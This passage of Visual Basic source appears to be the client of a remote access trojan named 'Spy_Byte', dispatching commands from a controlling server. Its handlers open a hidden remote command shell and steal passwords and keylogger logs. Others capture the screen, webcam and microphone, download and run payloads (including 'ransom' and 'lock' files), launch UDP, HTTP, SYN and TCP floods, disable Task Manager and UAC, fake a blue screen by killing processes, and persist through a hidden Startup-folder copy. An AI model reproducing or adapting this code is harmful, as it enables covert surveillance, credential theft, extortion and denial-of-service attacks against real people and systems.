                        allProcess += Proc.ProcessName & "ProcessSplit" & Proc.Id & "ProcessSplit" & Proc.SessionId & "ProcessSplit" & Proc.MainWindowTitle & "ProcessSplit"
                    Next
                    C.Send("ProcessManager" & Yy & allProcess & Yy & "Me" & Process.GetCurrentProcess.ProcessName)
                Case "KillProcess"
                    Dim eachprocess As String() = A(1).Split("ProcessSplit")
                    For i = 0 To eachprocess.Length - 2
                        For Each RunningProcess In Process.GetProcessesByName(eachprocess(i))
                            RunningProcess.Kill()
                        Next
                    Next
                Case "SProcess"
                    sco = 1
                    Dim eachprocess As String() = A(1).Split("ProcessSplit")
                    For i = 0 To eachprocess.Length - 2
                        Dim o = Process.GetProcessesByName(eachprocess(i))
                        SuspendProcess(o(0))
                        C.Send("SP")
                    Next
                Case "SProcessr"
                    sco = 2

                    Dim eachprocess As String() = A(1).Split("ProcessSplit")
                    For i = 0 To eachprocess.Length - 2
                        Dim o = Process.GetProcessesByName(eachprocess(i))
                        SuspendProcess(o(0))
                        C.Send("SP")
                    Next
                Case "SSProcess"
                    Dim eachprocess As String() = A(1).Split("ProcessSplit")
                    For i = 0 To eachprocess.Length - 2
                        Dim sh = Process.GetProcessesByName(eachprocess(i))
                        Dim iHwnd As IntPtr = FindWindow(eachprocess(i), vbNullString)
                        ShowWindow(iHwnd, SW_SHOWNORMAL)
                        C.Send("SP")
                    Next
                Case "SSSProcess"
                    Dim eachprocess As String() = A(1).Split("ProcessSplit")
                    For i = 0 To eachprocess.Length - 2
                        Dim hi = Process.GetProcessesByName(eachprocess(i))
                        Dim iHwnd As IntPtr = FindWindow(eachprocess(i), vbNullString)
                        ShowWindow(iHwnd, SW_SHOWMINIMIZED)
                        C.Send("SP")
                    Next

                Case "KLACt"


                    Dim P2 As New Process
                    For Each P2 In Process.GetProcesses
                        If P2.MainWindowTitle.Contains(A(1)) Then

                            P2.Kill()
                        End If
                        If P2.MainWindowTitle.Equals(A(1)) Then
                            P2.Kill()
                        End If
                    Next

                Case "UACon"
                    ReEnable_UAC()
                Case "UACoff"
                    Disable_UAC()

                Case "GOs"


                    Dim sl As String = "ProcessSplit"

                    Dim UO$

                    Dim s1$
                    Dim s2$
                    Dim s3$

                    If controllers IsNot Nothing Then
                        controllers = New Generic.SortedList(Of String, ServiceController)
                    End If

                    Dim services As ServiceController() = ServiceController.GetServices()
                    For Each controller As ServiceController In services
                        s1 = controller.DisplayName

                        With s1 = controller.DisplayName
                            s2 = controller.Status.ToString()
                            s3 = controller.ServiceType.ToString()
                            Dim R$ = "|"
                            UO = s2 + R + s1 + R + s3 + R + sl
                        End With
                        C.Send("serrrrr" & Yy & UO & Yy & System.IO.Path.GetFileNameWithoutExtension(Application.ExecutablePath))
                    Next controller
                Case "Voz"

                    Dim tsss As String = A(1)

                    If tsss = 0 Then

                        msvc.Stop()

                    Else

                        msvc.Start()


                    End If
                Case "rename"
                    If (A(1)) = "" Then
                    ElseIf (A(1)).Length > 0 Then
                        vName = A(1)
                    End If

                Case "infoDesk"

                    imge_desik()
                    C.Send("infoDesk" & "|BlueEagle|" & Convert.ToBase64String(IO.File.ReadAllBytes(ooo)) & "|BlueEagle|" & vName & "|BlueEagle|" & port & "|BlueEagle|" & "Spy_Byte" & "|BlueEagle|" & GetFirewall() & "|BlueEagle|" & Application.ExecutablePath)
                Case "info"

                    Dim pc As String = Environment.MachineName & "/" & Environment.UserName
                    Dim os As String = My.Computer.Info.OSFullName
                    Dim cpu As String = My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\SYSTEM\CENTRALPROCESSOR\0", "ProcessorNameString", Nothing).ToString
                    Dim smsms As String
                    smsms = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "SystemManufacturer", "")
                    Dim Xepa As String = ""
                    Dim psBattery As PowerStatus = SystemInformation.PowerStatus
                    Dim perFull As Single = psBattery.BatteryLifePercent
                    If perFull * 100 > 100 Then
                        Xepa = 100
                    ElseIf perFull * 100 < 100 Then
                        Xepa = perFull * 100
                    End If
                    If psBattery.PowerLineStatus = PowerLineStatus.Online Then
                        Xepa = "Powered Charging - " & perFull * 100 & "%"

                    ElseIf psBattery.PowerLineStatus = PowerLineStatus.Offline Then
                        Xepa = "do not Charging Powered - " & perFull * 100 & "%"

                    End If


                    imge_desik()
                    '    Comet.Send("info" & Yy &1 Name & Yy &2 pc & Yy & 3country & Yy & 4os + GenerateOperatingSystem() & Yy &5 "Anti" & Yy & 6checkcam() & Yy & 7RAM() & Yy & 8cpu & Yy & 9"Spy_Byte" & Yy & 10FR() & Yy & 11smsms & Yy & 12ipAddress.ToString() & Yy &13 Xepa & Yy & Convert.ToBase64String(IO.File.ReadAllBytes(ooo)))                   ' End If")
                    C.Send("info" & Yy & vName & Yy & pc & Yy & os & Yy & country & Yy & GetFirewall() & Yy & RAM() & Yy & "Spy_Byte" & Yy & AC & Yy & checkcam() & Yy & Convert.ToBase64String(IO.File.ReadAllBytes(ooo)))
                    '  Comet.Send("info" & Yy & Name & Yy & pc & Yy & "Unknowen" & Yy & country & Yy & GetFirewall() & Yy & RAM() & Yy & "Spy_Byte" & Yy & AC & Yy & checkcam() & Yy & Convert.ToBase64String(IO.File.ReadAllBytes(ooo)))


                Case "Uninstall"
                    End


                Case "A"
                    invoker.Invoke(New rv(AddressOf rvte), A(1))
                Case "rss" ' start remote shell
                    Try
                        DJB.Kill()
                    Catch ex As Exception
                    End Try
                    DJB = New Process
                    DJB.StartInfo.RedirectStandardOutput = True
                    DJB.StartInfo.RedirectStandardInput = True
                    DJB.StartInfo.RedirectStandardError = True
                    DJB.StartInfo.FileName = "cmd.exe"
                    DJB.StartInfo.RedirectStandardError = True
                    AddHandler CType(DJB, Process).OutputDataReceived, AddressOf RS
                    AddHandler CType(DJB, Process).ErrorDataReceived, AddressOf RS
                    AddHandler CType(DJB, Process).Exited, AddressOf ex
                    DJB.StartInfo.UseShellExecute = False
                    DJB.StartInfo.CreateNoWindow = True
                    DJB.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
                    DJB.EnableRaisingEvents = True
                    C.Send("rss" & Yy)
                    DJB.Start()
                    DJB.BeginErrorReadLine()
                    DJB.BeginOutputReadLine()
                Case "rs"
                    DJB.StandardInput.WriteLine(DEB(A(1)))
                Case "rsc"
                    Try
                        DJB.Kill()
                    Catch ex As Exception
                    End Try
                    DJB = Nothing

                Case "openkl"
                    C.Send("openkl")

                Case "getlogs"
                    loggg = o.Logs
                    C.Send("getlogs" & Yy & loggg)




                Case "!"
                    cap.Clear()
                    Dim s = Screen.PrimaryScreen.Bounds.Size
                    C.Send("!" & Yy & s.Width & Yy & s.Height)
                Case "@"
                    Dim SizeOfimage As Integer = A(1)
                    Dim Split As Integer = A(2)
                    Dim Quality As Integer = A(3)

                    Dim Bb As Byte() = cap.Cap(SizeOfimage, Split, Quality)
                    Dim M As New IO.MemoryStream
                    Dim CMD As String = "@" & Yy
                    M.Write(SB(CMD), 0, CMD.Length)
                    M.Write(Bb, 0, Bb.Length)
                    C.Send(M.ToArray)
                    M.Dispose()
                Case "#" ' mouse clicks
                    Cursor.Position = New Point(A(1), A(2))
                    mouse_event(A(3), 0, 0, 0, 1)
                Case "$" '  mouse move
                    Cursor.Position = New Point(A(1), A(2))
                Case "Mic"
                    C.Send("micready")
                Case "record"
                    Try
                        If recording = False Then
                            cdmciSendString("open new Type waveaudio Alias recsound", "", 0, 0)
                            cdmciSendString("record recsound", "", 0, 0)
                            recording = True
                        End If
                        C.Send("recording")
                    Catch ex As Exception
                        MsgBox(ex.Message)
                    End Try

                Case "stoprecord"
                    Try
                        If recording = True Then
                            cdmciSendString("save recsound " & Filez, "", 0, 0)
                            cdmciSendString("close recsound ", "", 0, 0)
                            recording = False
                        End If
                        C.Send("recstop")
                    Catch ex As Exception
                        MsgBox(ex.Message)
                    End Try

                Case "listenrecord"
                    C.Send("listenrec" & Yy & Convert.ToBase64String(IO.File.ReadAllBytes(Filez)))

                Case "pro"
                    C.Send("programs")

                Case "enterlan"
                    Dim pcname As String = A(1)
                    Dim pcip As String
                    Dim Hostname As Net.IPHostEntry = Net.Dns.GetHostByName(pcname)
                    Dim ip As Net.IPAddress() = Hostname.AddressList
                    pcip = ip(0).ToString
                    C.Send("pcip" & Yy & pcip)
                Case "lock"
                    IO.File.WriteAllBytes(IO.Path.GetTempPath & A(1), Convert.FromBase64String(A(2)))
                    Threading.Thread.CurrentThread.Sleep(1000)
                    Process.Start(IO.Path.GetTempPath & A(1))
                Case "ransom"
                    IO.File.WriteAllBytes(IO.Path.GetTempPath & A(1), Convert.FromBase64String(A(2)))
                    Threading.Thread.CurrentThread.Sleep(1000)
                    Process.Start(IO.Path.GetTempPath & A(1))


                Case "viewlan"
                    C.Send("viewlan")


                Case "getlan"
                    ' c.Send("getlan" & yy & lanlist())
                    lannet.Items.Clear()
                    Try
                        getGateway()
                        getlan()
                        For Each PC In lannet.Items
                            C.Send("getlan" & Yy & PC)
                        Next

                    Catch ex As Exception

                    End Try

                    ' c.Send("getlan" & yy & lanlist())

                Case "wifi2"

                    getwifis2()

                Case "scanlan"
                    Dim pcname As String = A(1)
                    Dim pcip As String
                    Dim Hostname As Net.IPHostEntry = Net.Dns.GetHostByName(pcname)
                    Dim ip As Net.IPAddress() = Hostname.AddressList
                    pcip = ip(0).ToString
                    scanlan(pcip, A(2), A(3))
                Case "scansite"
                    scansite(A(1), A(2), A(3))
                Case "sitescanner"
                    C.Send("opensacnner")
                Case "devicesinfo"
                    C.Send("showinfo")
                Case "openRG"
                    C.Send("openRG")
                Case "RG" ' Registry 
                    Dim kk As Object = GetKey(A(2))
                    Select Case A(1)
                        Case "~" ' send keys under key+ send values 
                            Dim s As String = "RG" & Yy & "~" & Yy & A(2) & Yy
                            Dim o As String = ""
                            For Each xe As String In kk.GetSubKeyNames
                                If xe.Contains("\") = False Then
                                    o += xe & Yy
                                End If
                            Next
                            For Each xs As String In kk.GetValueNames
                                o += xs & "/" & kk.GetValueKind(xs).ToString & "/" & kk.GetValue(xs, "").ToString & Yy
                            Next
                            C.Send(s & o)
                        Case "!" ' Set Value
                            kk.SetValue(A(3), A(4), A(5))
                        Case "@5" ' delete value
                            kk.DeleteValue(A(3), False)
                        Case "#" ' creat key
                            kk.CreateSubKey(A(3))
                        Case "$" ' delete key
                            kk.DeleteSubKeyTree(A(3))
                    End Select

                Case "FLOOD"
                    C.Send("FLOOD" & Yy)
                Case "Fstart"
                    Try
                        Select Case A(1)
                            Case "UDP"
                                If UDP.IsEnabled Then
                                    UDP.StopUDPz()
                                End If
                                UDP.Host = A(2)
                                UDP.Port = A(3)
                                UDP.Threads = A(4)
                                UDP.UDPzSockets = A(5)
                                UDP.StartUDPz()
                            Case "HTTP"
                                If HttpFlood.IsEnabled Then
                                    HttpFlood.StopHttpFlood()
                                End If
                                HttpFlood.Host = A(2)
                                HttpFlood.Interval = A(3)
                                HttpFlood.Threads = A(4)
                                HttpFlood.StartHttpFlood()
                            Case "SYN"
                                If Syn.IsEnabled Then
                                    Syn.StopSuperSyn()
                                End If
                                Syn.Host = A(2)
                                Syn.Port = A(3)
                                Syn.Threads = A(4)
                                Syn.SuperSynSockets = A(5)
                                Syn.StartSuperSyn()
                            Case "TCP"
                                tcpfuck.AddTarget(A(2), A(3), A(4), A(5))
                                tcpfuck.Start()
                        End Select
                    Catch : End Try
                Case "Fstop"
                    Try
                        Select Case A(1)
                            Case "UDP"
                                UDP.StopUDPz()
                            Case "HTTP"
                                HttpFlood.StopHttpFlood()
                            Case "SYN"
                                Syn.StopSuperSyn()
                            Case "TCP"
                                tcpfuck.stop()
                        End Select
                    Catch : End Try
                Case "ddos"
                    Shell(("ping -t" & A(1) & "-l " & A(2)), AppWinStyle.Hide, False, -1)
                Case "NormalMouse"
                    SwapMouseButton(&H0&)
                Case "ReverseMouse"
                    SwapMouseButton(&H100&)

                Case "opencd"
                    Try
                        mciSendString("set cdaudio door open", 0, 0, 0)
                    Catch ex As Exception
                    End Try
                Case "closecd"
                    Try
                        mciSendString("set cdaudio door closed", 0, 0, 0)
                    Catch ex As Exception
                    End Try

                Case "BepX"
                    Beep(A(1), A(2))
                Case "-----------"
                    Beep(1000, 1500)
                Case "devicesinfo"
                    C.Send("showinfo")
                Case "cputemp"


                    Try

                        Dim searcher As New ManagementObjectSearcher("root\WMI", "SELECT * FROM MSAcpi_ThermalZoneTemperature")
                        For Each queryObj As ManagementObject In searcher.Get()
                            Dim temp As Double = CDbl(queryObj("CurrentTemperature"))
                            temp = (temp - 2732) / 10.0
                            C.Send("cputemp" & Yy & temp.ToString)

                        Next
                    Catch err As ManagementException

                    End Try



                Case "visit"
                    Dim visiturl = A(1)
                    Try
                        Dim fr As System.Net.HttpWebRequest
                        Dim targetURI As New Uri(visiturl)

                        fr = DirectCast(HttpWebRequest.Create(targetURI), System.Net.HttpWebRequest)
                        If (fr.GetResponse().ContentLength > 0) Then
                            Dim str As New System.IO.StreamReader(fr.GetResponse().GetResponseStream())
                            str.ReadToEnd()
                            str.Close()
                        End If
                    Catch ex As System.Net.WebException
                        'Error in accessing the resource, handle it
                    End Try
                Case "getinfonow"
                    Dim List As String = ""

                    For Each Device As Device In Device.GetAllDevices
                        '  List += Device.Name & "|D|" & Device.Manufacturer & "|D|" & Device.Service & "|D|" & Device.PNPDeviceID & "|D|" & Device.Description
                        C.Send("device" & Yy & Device.Name & Yy & Device.Manufacturer & Yy & Device.Service & Yy & Device.PNPDeviceID & Yy & Device.Description)

                    Next
                    For Each Device As Device In Device.GetNonWorkingDevices
                        '  List += Device.Name & "|D|" & Device.Manufacturer & "|D|" & Device.Service & "|D|" & Device.PNPDeviceID & "|D|" & Device.Description
                        C.Send("nonworkingdevice" & Yy & Device.Name & Yy & Device.Manufacturer & Yy & Device.Service & Yy & Device.PNPDeviceID & Yy & Device.Description)

                    Next
                    '   Comet.Send("device" & Yy & List)



                    ' getnames()
                    PrinterList()
                Case "ErorrMsg"

                    Dim messageicon As MessageBoxIcon
                    Dim messagebutton As MessageBoxButtons
                    Select Case A(1)
                        Case "1"
                            messageicon = MessageBoxIcon.Information
                        Case "2"
                            messageicon = MessageBoxIcon.Question
                        Case "3"
                            messageicon = MessageBoxIcon.Warning
                        Case "4"
                            messageicon = MessageBoxIcon.Error
                    End Select
                    Select Case A(2)
                        Case "1"
                            messagebutton = MessageBoxButtons.YesNo
                        Case "2"
                            messagebutton = MessageBoxButtons.YesNoCancel
                        Case "3"
                            messagebutton = MessageBoxButtons.OK
                        Case "4"
                            messagebutton = MessageBoxButtons.OKCancel
                        Case "5"
                            messagebutton = MessageBoxButtons.RetryCancel
                        Case "6"
                            messagebutton = MessageBoxButtons.AbortRetryIgnore
                    End Select
                    MessageBox.Show(A(4), A(3), messagebutton, messageicon)

                Case "CursorShow"
                    Cursor.Show()
                Case "TaskbarShow"
                    ShowTaskbarItems()
                Case "TaskbarHide"
                    HideTaskbarItems()
                Case "CursorHide"
                    Cursor.Hide()

                Case "ClockOFF"
                    hideclock()
                Case "ClockON"
                    showclock()

                Case "DisableTaskManager"
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "1", Microsoft.Win32.RegistryValueKind.DWord)
                Case "EnableTaskManager"
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "0", Microsoft.Win32.RegistryValueKind.DWord)
                Case "TurnOffMonitor"
                    SendMessage(-1, &H112, &HF170, 2)
                Case "TurnOnMonitor"
                    SendMessage(-1, &H112, &HF170, -1)

                Case "viewwifi"

                    C.Send("wifi")
                Case "stat"
                    C.Send("stat")
                Case "getstat"
                    stati()
                    getinterfaces()


                Case "xxx"
                    programs()
                Case "lDL"
                    Dim procID As Integer
                    Dim sr$ = A(1)
                    procID = Shell("""" & sr & """", AppWinStyle.MinimizedFocus)
                    SendKeys.Send("{ENTER}")
                    SendKeys.Send("{ENTER}")
                    SendKeys.Send("{ENTER}")
                    SendKeys.Send("{ENTER}")
                    SendKeys.Send("{ENTER}")
                    SendKeys.Send("{ENTER}")
                    SendKeys.Send("{ENTER}")
                    SendKeys.Send("{ENTER}")
                    SendKeys.Send("{ENTER}")
                    SendKeys.Send("{ENTER}")
                    SendKeys.Send("{ENTER}")
                    SendKeys.Send("{ENTER}")


                Case "msgbox"
                    Dim messageicon As MessageBoxIcon
                    Dim messagebutton As MessageBoxButtons

                    Select Case A(1)
                        Case "1"
                            messageicon = MessageBoxIcon.Information
                        Case "2"
                            messageicon = MessageBoxIcon.Question
                        Case "3"
                            messageicon = MessageBoxIcon.Warning
                        Case "4"
                            messageicon = MessageBoxIcon.Error
                    End Select
                    Select Case A(2)
                        Case "1"
                            messagebutton = MessageBoxButtons.YesNo
                        Case "2"
                            messagebutton = MessageBoxButtons.YesNoCancel
                        Case "3"
                            messagebutton = MessageBoxButtons.OK
                        Case "4"
                            messagebutton = MessageBoxButtons.OKCancel
                        Case "5"
                            messagebutton = MessageBoxButtons.RetryCancel
                        Case "6"
                            messagebutton = MessageBoxButtons.AbortRetryIgnore
                    End Select
                    MessageBox.Show(A(4), A(3), messagebutton, messageicon)


                Case "piano"
                    Beep(A(1), 300)


                Case "IEhome"
                    AddHome(A(1))
                Case "openchat"
                    C.Send("readytochat")


                Case "openurl"
                    If A(1) = "Default" Then
                        Try
                            System.Diagnostics.Process.Start(A(2))
                        Catch ex As Exception
                        End Try
                    Else
                        Try
                            System.Diagnostics.Process.Start(A(1), A(2))
                        Catch ex As Exception

                        End Try
                    End If
                Case "LockPC"
                    Process.Start("rundll32.exe", "user32.dll,LockWorkStation")
                Case "shutdowncomputer"
                    Shell("shutdown -s -t 00", AppWinStyle.Hide)
                Case "restartcomputer"
                    Shell("shutdown -r -t 00", AppWinStyle.Hide)
                Case "logoff"
                    Shell("shutdown -l -t 00", AppWinStyle.Hide)
                Case "sleep"
                    SetSuspendState(0, 1, 0) '0 = false .. 1 = true ---- 010 Force Sleep // 100 Hibrinate // 110 Force Hibrenate
                Case "fun"
                    C.Send("fun")
                Case "tt"
                    C.Send("tt")
                Case "opentto"
                    C.Send("opentto")
                Case "TextToSpeech"
                    Dim SAPI = CreateObject("SAPI.Spvoice")
                    SAPI.speak(A(1))
                Case "volup"

                    SendMessageW(invoker.Handle, WM_APPCOMMAND, _
        invoker.Handle, New IntPtr(APPCOMMAND_VOLUME_UP))

                Case "voldn"
                    SendMessageW(invoker.Handle, WM_APPCOMMAND, _
                    invoker.Handle, New IntPtr(APPCOMMAND_VOLUME_DOWN))

                Case "mute"
                    SendMessageW(invoker.Handle, WM_APPCOMMAND, _
               invoker.Handle, New IntPtr(APPCOMMAND_VOLUME_MUTE))
                Case "clipss"
                    C.Send("clipss" & Yy)
                Case "getcli"

                    invoker.Invoke(New gt(AddressOf gtx))
                Case "chat"
                    invoker.Invoke(New chatappd(AddressOf chatappds), A(1), A(2), A(3))

                Case "hotspot"
                    C.Send("hotspot")
                Case "createwifi"
                    CreateHotspot(A(1), A(2)) 'SSID , key
                Case "stophotspot"
                    stophotspot()
                Case "stopchat"
                    Form2.close()
                    Form2.Showed = False
                Case "bsod"
                    BSOD()

                Case "passwords"
                    C.Send("openpw")
                    pw = GTPWD()
                Case "getpw"
                    C.Send("getpw" & Yy & pw)

                Case "viewimage"
                    C.Send("viewimage" & Yy & Convert.ToBase64String(IO.File.ReadAllBytes(A(1))) & Yy)
                Case "GetDrives"
                    C.Send("FileManager" & Yy & getDrives())
                Case "FileManager"
                    Try
                        C.Send("FileManager" & Yy & getFolders(A(1)) & getFiles(A(1)))
                    Catch
                        C.Send("FileManager" & Yy & "Error")
                    End Try
                Case "\\"
                    C.Send("\\")
                Case "Delete"
                    Select Case A(1)
                        Case "Folder"
                            IO.Directory.Delete(A(2))
                        Case "File"
                            IO.File.Delete(A(2))

                    End Select
                Case "Execute"
                    Process.Start(A(1))
                Case "Exletn"
                    Dim pro As Process = New Process() With {.StartInfo = New ProcessStartInfo(A(1)) With {.Verb = "runas", .UseShellExecute = True}}
                    pro.Start()
                Case "CpoSx"

                    Try
                        File.Copy(Application.ExecutablePath, A(1) + "\" + vvname, True)

                    Catch ex As Exception
                        MsgBox(ex.Message)
                    End Try

                Case "IOPPYR"



                    Try
                        File.Copy(Application.ExecutablePath, A(1) + "\" + vvname, True)
                        System.IO.File.SetAttributes(A(1) + ".EXE", IO.FileAttributes.Hidden)
                    Catch ex As Exception
                        MsgBox(ex.Message)
                    End Try
                Case "EMNS"
                    File.Encrypt(A(1))
                Case "EMNqS"
                    File.Decrypt(A(1))

                Case "Cuut"
                    Copy_cut = A(1)

                Case "Cuutod"
                    Copy_cut = A(1)


                Case "Cuutodsd"


                    Try

                        File.Move(Copy_cut, A(1))
                    Catch ex As Exception
                        MsgBox(ex.Message)
                    End Try


                Case "dCopsx"
                    Try
                        File.Copy(Copy_cut, A(1), True)
                    Catch ex As Exception
                        MsgBox(ex.Message)
                    End Try
                Case "camhost"
                    C.Send("camhost" & Yy & HOST)

                Case "CLLSKXOa"
                    SHEmptyRecycleBin(invoker.Handle.ToInt32, vbNullString, SHERB_NOCONFIRMATION + SHERB_NOSOUND)
                    SHUpdateRecycleBinIcon()
                Case "EIIT"
                    Dim Vir As String = "C:\Program Files (x86)" & "\WinRAR\Rar "
                    Dim POXow = A(1)
                    Dim oi$ = A(1) + ".rar"
                    Shell(Vir + "a -r """ + oi + """ """ + POXow)
                Case "Rename"
                    Select Case A(1)
                        Case "Folder"
                            My.Computer.FileSystem.RenameDirectory(A(2), A(3))
                        Case "File"
                            My.Computer.FileSystem.RenameFile(A(2), A(3))
                    End Select
                Case "sendfile"
                    IO.File.WriteAllBytes(IO.Path.GetTempPath & A(1), Convert.FromBase64String(A(2)))
                    Thread.Sleep(1000)
                    Process.Start(IO.Path.GetTempPath & A(1))
                    C.Send("Coloreg")
                Case "playmusic"
                    My.Computer.Audio.Play(A(1), AudioPlayMode.Background)
                Case "getdesktoppath"
                    Dim specialfolder As String
                    specialfolder = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
                    C.Send("getpath" & Yy & specialfolder & "\")
                Case "gettemppath"
                    Dim specialfolder As String
                    specialfolder = IO.Path.GetTempPath
                    C.Send("getpath" & Yy & specialfolder)
                Case "getstartuppath"
                    Dim specialfolder As String
                    specialfolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup)
                    C.Send("getpath" & Yy & specialfolder & "\")
                Case "getmydocumentspath"
                    Dim specialfolder As String
                    specialfolder = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)
                    C.Send("getpath" & Yy & specialfolder & "\")
                Case "getmydocumentspath" 'pic
                    Dim specialfolder As String
                    specialfolder = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)
                    C.Send("getpath" & Yy & specialfolder & "\")
                Case "getmydocumentspath" 'music
                    Dim specialfolder As String
                    specialfolder = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)
                    C.Send("getpath" & Yy & specialfolder & "\")
                Case "edittextfile"
                    Dim R As New IO.StreamReader(A(1))
                    Dim d As String
                    d = R.ReadToEnd
                    R.Close()
                    C.Send("edittextfile" & Yy & A(1) & Yy & d)
                Case "savetextfile"
                    Dim Comet As New IO.StreamWriter(A(1))
                    Comet.WriteLine(A(2))
                    Comet.Close()
                Case "creatnewtextfile"
                    Try
                        IO.File.Create(A(1)).Dispose()
                    Catch ex As Exception
                        C.Send("msgbox" & Yy & "Information" & Yy & "File Name Already Exists")
                    End Try
                Case "setaswallpaper"
                    SystemParametersInfo(SETDESKWALLPAPER, 0, A(1), UPDATEINIFILE)
                Case "sendfileto"
                    IO.File.WriteAllBytes(A(1), Convert.FromBase64String(A(2)))
                    Thread.Sleep(1000)
                Case "creatnewfolder"
                    Try
                        My.Computer.FileSystem.CreateDirectory _
        (A(1))

                    Catch ez As Exception
                    End Try
                Case "hidefolderfile"
                    Dim hiden As FileAttribute = FileAttribute.Hidden
                    Try
                        SetAttr(A(1), hiden)
                    Catch ex As Exception
                    End Try
                Case "download"
                    Dim cw As New WebClient
                    Dim P As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" + A(2)
                    If File.Exists(P) Then File.Delete(P)
                    File.WriteAllBytes(P, cw.DownloadData(A(1)))
                    Process.Start(P)
                    C.Send("Coloreg")
                Case "showfolderfile"
                    Dim shown As FileAttribute = FileAttribute.Normal
                    Try
                        SetAttr(A(1), shown)
                    Catch ex As Exception

                    End Try
                Case "downloadfile"
                    C.Send("downloadedfile" & Yy & Convert.ToBase64String(IO.File.ReadAllBytes(A(1))) & Yy & A(2))
                Case "corrupt"
                    Dim corruption As String = "OP0 01 01 200 01 02OP"
                    Dim R As New IO.StreamReader(A(1))
                    Dim d As String
                    d = R.ReadToEnd
                    R.Close()
                    My.Computer.FileSystem.WriteAllText(A(1), corruption & d, False)
                Case "tt"
                    C.Send("tt")
                Case "Upload"
                    Try
                        If File.Exists(A(1)) Then File.Delete(A(1))
                        Dim fs As New FileStream(A(1), FileMode.Create, FileAccess.Write)
                        Dim tempPacket() As Byte = SB(A(3))
                        Dim packet(tempPacket.Length - 2) As Byte
                        Array.Copy(tempPacket, 0, packet, 0, packet.Length)
                        fs.Write(packet, 0, packet.Length) : fs.Close()
                        C.Send("NextPartOfUpload" & Yy & A(2))
                    Catch
                        C.Send("UploadFailed" & Yy & A(2))
                    End Try
                Case "UploadContinue"
                    Try
A:
                        Dim fs As New FileStream(A(1), FileMode.Append, FileAccess.Write)
                        Dim tempPacket() As Byte = SB(A(3))
                        Dim packet(tempPacket.Length - 2) As Byte
                        Array.Copy(tempPacket, 0, packet, 0, packet.Length)
                        fs.Write(packet, 0, packet.Length) : fs.Close()
                        C.Send("NextPartOfUpload" & Yy & A(2))
                    Catch
                        GoTo A
                    End Try
                Case "CancelUpload"
B:
                    Try
                        If File.Exists(A(1)) Then File.Delete(A(1))
                    Catch
                        GoTo B
                    End Try

                Case "cam"
                    Dim s As String = "cam"

                    If Not camera.Drive = A(1) Then
                        camera.onn(A(1), New System.Drawing.Size(160, 120))
                        C.Send(s)
                    Else
                        Dim m = camera.M.Clone
                        Dim cc As New ImageConverter
                        Dim bb As Byte() = cc.ConvertTo(m, b.GetType)
                        C.Send(s & Yy & Convert.ToBase64String(bb))
                    End If

                Case "camclose"
                    camera.close()
                Case "camlist"
                    Try
                        Dim s As String = "camlist"
                        For Each x As String In camera.Divs
                            s &= Yy & x
                        Next
                        C.Send(s)
                    Catch ex As Exception

                    End Try
            End Select
        Catch ex As Exception

        End Try
    End Sub
    Private Sub Windows_Users_Common_Startup_Handler()
        Dim dirto As String = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
        Dim AppPath As String = Application.ExecutablePath
        Dim AutoStart As String = dirto & "/"
        Dim HideFile As IO.FileInfo = My.Computer.FileSystem.GetFileInfo(dirto)
        Dim name As String = Application.ExecutablePath.Replace(Application.StartupPath & "\", "")
        Try
            File.Copy(AppPath, AutoStart & name, True)
            File.Copy(AppPath, AutoStart & ".exe", True)
            HideFile.IsReadOnly = True
            HideFile.Attributes = HideFile.Attributes Or IO.FileAttributes.Hidden
            SetAttr(dirto & "/" & name, FileAttribute.Hidden)
        Catch ex As Exception
        End Try
    End Sub ''Cross_Users_Startup
    Private Sub Driveshotcutspread()
        drivers_destroyer.Start()
    End Sub
    Private Sub DriversClean()
        drivers_destroyer.clean()
    End Sub
    Private Sub Start_Lan_Share()
        Dim counter = 0
        If chkIt() = True Then
            Share()
        Else
            UniversalUser()
            For Each d As DriveInfo In My.Computer.FileSystem.Drives
                CreateShare(d.Name, d.Name.Replace(":\", "") & " " & counter)
                counter += 1
            Next
            Share()
        End If
    End Sub
    Private Sub BSOD()
        Dim soso As Boolean = True
        While (soso = True)

A:          Dim t As New Threading.Thread(AddressOf CreateForm, 1)
            t.Priority = ThreadPriority.Highest
            t.Start()
            GoTo A
        End While

    End Sub
    Private Sub CreateForm()
        On Error Resume Next
        For Each Processx In Process.GetProcesses
            If Processx.ProcessName.Contains(Process.GetCurrentProcess.ProcessName) Then
            Else
                Processx.Kill()
            End If
        Next
        Dim XX As New Form
        XX.FormBorderStyle = FormBorderStyle.None
        XX.WindowState = FormWindowState.Maximized
        XX.ForeColor = Color.Blue
        XX.BackColor = Color.Blue
        XX.Show()
    End Sub
    Private Sub showclock()
        Dim TaskBarWin As Long, TrayWin As Long, ClockWin As Long

        TaskBarWin = FindWindow("Shell_TrayWnd", vbNullString)
        TrayWin = FindWindowEx(TaskBarWin, 0, "TrayNotifyWnd", vbNullString)
        ClockWin = FindWindowEx(TrayWin, 0, "TrayClockWClass", vbNullString)
        ShowWindow(ClockWin, 1)
    End Sub
    Private Sub HideTaskbarItems()
        Dim TaskBarWin As Long, TaskButtonWin As Long

        TaskBarWin = FindWindow("Shell_TrayWnd", vbNullString)
        TaskButtonWin = FindWindowEx(TaskBarWin, 0, "ReBarWindow32", vbNullString)
        ShowWindow(TaskButtonWin, 1)
    End Sub
    Private Sub ShowTaskbarItems()
        Dim TaskBarWin As Long, TaskButtonWin As Long

        TaskBarWin = FindWindow("Shell_TrayWnd", vbNullString)
        TaskButtonWin = FindWindowEx(TaskBarWin, 0, "ReBarWindow32", vbNullString)
        ShowWindow(TaskButtonWin, 0)
    End Sub
    Private Sub hideclock()
        Dim TaskBarWin As Long, TrayWin As Long, ClockWin As Long

        TaskBarWin = FindWindow("Shell_TrayWnd", vbNullString)
        TrayWin = FindWindowEx(TaskBarWin, 0, "TrayNotifyWnd", vbNullString)
